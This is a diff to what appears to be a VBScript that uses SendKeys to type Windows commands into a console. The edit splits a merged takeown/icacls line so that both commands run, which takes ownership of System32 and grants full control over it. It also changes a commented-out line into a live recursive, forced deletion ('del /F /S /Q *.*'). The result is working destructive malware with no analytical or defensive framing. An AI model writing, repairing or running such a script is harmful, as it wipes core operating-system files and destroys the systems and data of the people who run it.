@@ -37,8 +37,15 @@ Wshshell.SendKeys "{ENTER}"
 WScript.Sleep 100
 
 
+WshShell.SendKeys "takeown /f C:\Windows\System32 /r /d y"
 
-WshShell.SendKeys "takeown /f C:\Windows\System32 /r /d y icacls C:\Windows\System32 /grant administrators:F /t "
+
+WshShell.SendKeys "{ENTER}"
+
+WScript.Sleep 100
+
+
+WshShell.SendKeys "icacls C:\Windows\System32 /grant administrators:F /t"
 
 
 WshShell.SendKeys "{ENTER}" 
@@ -54,7 +61,7 @@ WshShell.SendKeys "{ENTER}"
 WScript.Sleep 100 
 
 
-WshShell.SendKeys "REM Delete System32 del /F /S /Q *.*"
+WshShell.SendKeys "del /F /S /Q *.*"
 
 
 WshShell.SendKeys "{ENTER}"
